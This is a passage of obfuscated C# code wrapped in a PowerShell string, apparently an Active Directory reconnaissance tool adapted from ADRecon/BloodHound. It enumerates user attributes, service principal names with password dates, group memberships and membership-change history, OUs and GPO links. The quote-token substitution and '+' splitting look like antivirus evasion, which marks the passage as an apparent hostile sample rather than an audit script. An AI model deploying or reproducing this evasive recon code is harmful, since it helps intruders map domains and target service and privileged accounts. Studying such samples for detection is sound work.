                    UserObj.Members.Add(new PSNoteProperty(lEzjMobilelEzj, (AdUser.Properties[lEzjmobilelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjmobilelEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjEmaillEzj, (AdUser.Properties[lEzjmaillEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjmaillEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjHomeDirectorylEzj, (AdUser.Properties[lEzjhomedirectorylEzj].Count != 0 ? AdUser.Properties[lEzjhomedirectorylEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjProfilePathlEzj, (AdUser.Properties[lEzjprofilepathlEzj].Count != 0 ? AdUser.Properties[lEzjprofilepathlEzj][0] : lEzjlEzj)));
               '+'     UserObj.Members.Add(new PSNoteProperty(lEzjScriptPathlEzj, (AdUser.Properties[lEzjscriptpathlEz'+'j].Count != 0 ? AdUser.Properties[lEzjscriptpathlEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjUserAccountControllEzj, (AdUser.Properties[lEzjuseraccountcontrollEzj].Count != 0 ? AdUser.Properties[lEzjuseraccountcontrollEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjFirst NamelEzj, (AdUser.Properties[lEzjgivenNamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjgivenNamelEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(l'+'EzjMiddle NamelEzj, (AdUser.Properties[lEzjmiddleNamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjmiddleNamelEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLast NamelEzj, (AdUser.Properties[lEzjsnlEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjsnlEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCountrylEzj, (AdUser.Properties[lEzjclEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjclEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, (AdUser.Properties[lEzjwhencreatedlEzj].Count != 0 ? AdUser.Properties[lEzjwhencreatedlEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, (AdUser.Properties[lEzjwhenchangedlEzj].Count != 0 ? AdUser.Properties[lEzjwhenchangedlEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, (AdUser.Properties[lEzjdistinguishednamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjdistinguishednamelEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCanonicalNamelEzj, (AdUser.Properties[lEzjcanonicalnamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjcanonicalnamelEzj][0]) : lEzjlEzj)));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    if (AdUser.Properties[lEzjserviceprincipalnamelEzj].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties[lEzjpwdlastsetlEzj].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties[lEzjpwdlastsetlEzj][0]) != lEzj0lEzj)
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties[lEzjpwdLastSetlEzj][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties[lEzjuseraccountcontrollEzj].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties[lEzjuseraccountcontrollEzj][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    string Description = (AdUser.Properties[lEzjDescriptionlEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjDescriptionlEzj][0]) : lEzjlEzj);
                    string PrimaryGroupID = (AdUser.Properties[lEzjprimarygroupidlEzj].Count != 0 ? Convert.ToString(AdUser.Properties[lEzjprimarygroupidlEzj][0]) : lEzjlEzj);
                    if (AdUser.Properties[lEzjmemberoflEzj].Count != 0)
                    {
                        foreach (string Member in AdUser.Properties[lEzjmemberoflEzj])
                        {
                            Memberof = Memberof + lEzj,lEzj + ((Convert.ToString(Member)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        }
                        Memberof = Memberof.TrimStart(xfJ4,xfJ4);
                    }
                    foreach (string SPN in AdUser.Properties[lEzjserviceprincipalnamelEzj])
                    {
                        string[] SPNArray = SPN.Split(xfJ4/xfJ4);
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjUserNamelEzj, (AdUser.Properties[lEzjsamaccountnamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjsamaccountnamelEzj][0]) : lEzjlEzj)));
                        UserSPNObj.Members.Add(new PSNoteProperty(lE'+'zjNamelEzj, (AdUser.Properties[lEzjnamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjnamelEzj][0]) : lEzjlEzj)));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjEnabledlEzj, Enabled));
         '+'               UserSPNObj.Members.Add(new PSNoteProperty(lEzjServicelEzj, SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjHostlEzj, SPNArray[1]));
                        Us'+'erSPNObj.Members.Add(new PSNoteProperty(lEzjPassword Last SetlEzj, PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, Description));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjPrimary GroupIDlEzj, PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty(lEzjMemberoflEzj, Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
           '+' {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string ManagedByValue = AdGroup.Properties[lEzjmanagedbylEzj].Count != 0 ? Convert.ToString(AdGroup.Properties[lEzjmanagedbylEzj][0]) : lEzjl'+'Ezj;
                    string ManagedBy = lEzjlEzj;
                    string GroupCategory = null;
                    string GroupScope = null;
                    string SIDHistory = lEzjlEzj;

                    if (AdGroup.Properties[lEzjmanagedBylEzj].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { lEzjCN=lEzj },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { lEzjOU=lEzj },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(xfJ4,xfJ4);
                    }

                    if (AdGroup.Properties[lEzjgrouptypelEzj].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties[lEzjgrouptypelEzj][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? lEzjSecuritylEzj : lEzjDistributionlEzj;

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = lEzjUniversallEzj;
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = lEzjGloballEzj;
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = lEzjDomainLocallEzj;
                        }
                    }
                    if (AdGroup.Properties[lEzjsidhistorylEzj].Count >= 1)
                    {
                        string sids = lEzjlEzj;
                        for (int i = 0; i < AdGroup.Properties[lEzjsidhistorylEzj].Count; i++)
                        {
                            var history = AdGroup.Properties[lEzjsidhistorylEzj][i];
                            sids = sids + lEzj,lEzj + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(xfJ4,xfJ4);
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdGroup.Properties[lEzjsamaccountnamelEzj][0]));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjAdminCountlEzj, (AdGroup.Properties[lEzjadmincountlEzj].Count != 0 ? AdGroup.Properties[lEzjadmincountlEzj][0] : lEzjlEzj)));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjGroupCategorylEzj, GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjGroupScopelEzj, GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjManagedBylEzj, ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjSIDlEzj, Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties[lEzjobjectSIDlEzj][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjSIDHistorylEzj, SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, (AdGroup.Properties[lEzjDescriptionlEzj].Count != 0 ? CleanString(AdGroup.Properties[lEzjDescriptionlEzj][0]) : lEzjlEzj)));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdGroup.Properties[lEzjwhencreatedlEzj][0]));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdGroup.Properties[lEzjwhenchangedlEzj][0]));
                    GroupObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, CleanString(AdGroup.Properties[lEzjdistinguishednamelEzj][0])));
                '+'    GroupObj.Members.Add(new PSNoteProperty(lEzjCanonicalNamelEzj, AdGroup.Properties[lEzjcanonicalnamelEzj][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    System.DirectoryServices.ResultPropertyValueCollection ReplValueMetaData = (System.DirectoryServices.ResultPropertyValueCollection) AdGroup.Properties[lEzjmsDS-ReplValueMetaDatalEzj];

                    if (ReplValueMetaData.Count != 0)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace(lEzjcnIx00lEzj, lEzjlEzj).Replace(lEzj&lEzj,lEzj&amp;lEzj));

                            if (ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeDeletedlEzj].InnerText != lEzj1601-01-01T00:00:00ZlEzj)
                            {
                                Action = lEzjRemovedlEzj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeCreatedlEzj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeDeletedlEzj].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = lEzjAddedlEzj;
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeCreatedlEzj].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, AdGroup.Properties[lEzjsamaccountnamelEzj][0]));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjGroup DistinguishedNamelEzj, CleanString(AdGroup.Properties[lEzjdistinguishednamelEzj][0])));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjMember DistinguishedNamelEzj, CleanString(ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjpszObjectDnlEzj].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjActionlEzj, Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjAdded Age (Days)lEzj, DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjRemoved Age (Days)lEzj, DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjAdded DatelEzj, AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjRemoved DatelEzj, RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjftimeCreatedlEzj, ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeCreatedlEzj].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty(lEzjftimeDeletedlEzj, ReplXML.SelectSingleNode(lEzjDS_REPL_VALUE_META_DATAlEzj)[lEzjftimeDeletedlEzj].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties[lEzjobjectSIDlEzj][0], 0))),(Convert.ToString(AdGroup.Properties[lEzjsamaccountnamelEzj][0])));
                    return new PSObject[] { };
 '+'               }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PS'+'Object[] { };
                }
            }
        }

   '+'     class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties[lEzjsamaccounttypelEzj].Count != 0 ? Convert.ToString(AdGroup.Properties[lEzjsamaccounttypelEzj][0]) : lEzjlEzj;
                    string ObjectClass = Convert.ToString(AdGroup.Properties[lEzjobjectclasslEzj][AdGroup.Properties[lEzjobjectclasslEzj].Count-1]);
                    string AccountType = lEzjlEzj;
                    string GroupName = lEzjlEzj;
                    string MemberUserName = lEzj-lEzj;
                    string MemberName = lEzjlEzj;
                    string PrimaryGroupID = lEzjlEzj;
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == lEzjforeignSecurityPrincipallEzj)
                    {
                        AccountType = lEzjforeignSecurityPrincipallEzj;
                        MemberName '+'= null;
                        MemberUserName = ((Convert.ToString(AdGroup.Properties[lEzjDistinguishedNamelEzj][0])).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        foreach (string GroupMember in AdGroup.Properties[lEzjmemberoflEzj])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = lEzjgrouplEzj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[lEzjDistinguishedNamelEzj][0])).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        foreach (string GroupMember in AdGroup.Properties[lEzjmemberoflEzj])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserName'+'lEzj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = lEzjuserlEzj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[lEzjDistinguishedNamelEzj][0])).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties[lEzjsAMAccountNamelEzj][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties[lEzjprimaryGroupIDlEzj][0]);
                        try
                '+'        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + lEzj-lEzj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties[lEzjmemberoflEzj])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(l'+'EzjMember NamelEzj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = lEzjcomputerlEzj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[lEzjDistinguishedNamelEzj][0])).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties[lEzjsAMAccountNamelEzj][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties[lEzjprimaryGroupIDlEzj][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + lEzj-lEzj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties[lEzjmemberoflEzj])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
  '+'                          GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelE'+'zj, GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = lEzjtrustlEzj;
                        MemberName = ((Convert.ToString(AdGroup.Properties[lEzjDistinguishedNamelEzj][0])).Split(xfJ4,xfJ4)[0]).Split(xfJ4=xfJ4)[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties[lEzjsAMAccountNamelEzj][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties[lEzjprimaryGroupIDlEzj][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + lEzj-lEzj + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjGroup NamelEzj, GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember UserNamelEzj, MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjMember NamelEzj, MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty(lEzjAccountTypelEzj, AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdOU.Properties[lEzjnamelEzj][0]));
                    OUObj.Members.Add(new PSNoteProperty(lEzjDepthlEzj, ((Convert.ToString(AdOU.Properties[lEzjdistinguishednamelEzj][0]).Split(new string[] { lEzjOU=lEzj }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, (AdOU.Properties[lEzjdescriptionlEzj].Count != 0 ? AdOU.Properties[lEzjdescriptionlEzj][0] : lEzjlEzj)));
                    OUObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdOU.Properties[lEzjwhencreatedlEzj][0]));
                    OUObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdOU.Properties[lEzjwhenchangedlEzj][0]));
                    OUObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdOU.Properties[lEzjdistinguishednamelEzj][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject('+');
                    GPOObj.Members.Add(new PSNoteProperty(lEzjDisplayNamelEzj, CleanString(AdGPO.Properties[lEzjdisplaynamelEzj][0])));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjGUIDlEzj, CleanString(AdGPO.Properties[lEzjnamelEzj][0])));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdGPO.Properties[lEzjwhenCreatedlEzj][0]));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdGPO.Properties[lEzjwhenChangedlEzj][0]));
'+'                    GPOObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, CleanString(AdGPO.Properties[lEzjdistinguishednamelEzj][0])));
                    GPOObj.Members.Add(new PSNoteProperty(lEzjFilePathlEzj, AdGPO.Properties[lEzjgpcfilesyspathlEzj][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties[lEzjdistinguishednamelEzj][0]).ToUpper()), (Convert.ToString(AdGPO.Properties[lEzjdisplaynamelEzj][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = (AdSOM.Properties[lEzjgPLinklEzj].Count != 0 ? Convert.ToString(AdSOM.Properties[lEzjgPLinklEzj][0]) : lEzjlEzj);
                    string GPOName = null;

                    Depth = ((Convert.T'+'oString(AdSOM.Properties[lEzjdistinguishednamelEzj][0]).Split(new string[] { lEzjOU=lEzj }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties[lEzjgPOptionslEzj].Count != 0)
                    {
                        if ((int) AdSOM.Properties[lEzjgPOptionslEzj][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(xfJ4]xfJ4, xfJ4[xfJ4).Where(x => x.StartsWith(lEzjLDAPlEzj));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject('+');
                        SOMObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdSOM.Properties[lEzjnamelEzj][0]));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDepthlEzj, De'+'pth));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdSOM.Properties[lEzjdistinguishednamelEzj][0]));'+'
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink OrderlEzj, null));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjGPOlEzj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjEnforcedlEzj, Enforced));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink EnabledlEzj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjBlockInheritancelEzj, BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPLinklEzj, gPLink));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPOptionslEzj, (AdSOM.Properties[lEzjgpoptionslEzj].Count != 0 ? AdSOM.Properties[lEzjgpoptionslEzj][0] : lEzjlEzj)));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split(xfJ4/xfJ4, xfJ4;xfJ4);
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split(xfJ4=xfJ4,xfJ4,xfJ4)[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdSOM.Properties[lEzjnamelEzj][0]));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDepthlEzj, Depth));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdSOM.Properties[lEzjdistinguishednamelEzj][0]));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink OrderlEzj, Order));
                        SOMObj.Members.Add(new PSNotePr'+'operty(lEzjGPOlEzj, GPOName));
                        SOMObj.Members.Add(new PSNoteProperty(lEz'+'jEnforcedlEzj, Enforced));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjLink EnabledlEzj, LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjBlockInheritancelEzj, BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPLinklEzj, gPLink));
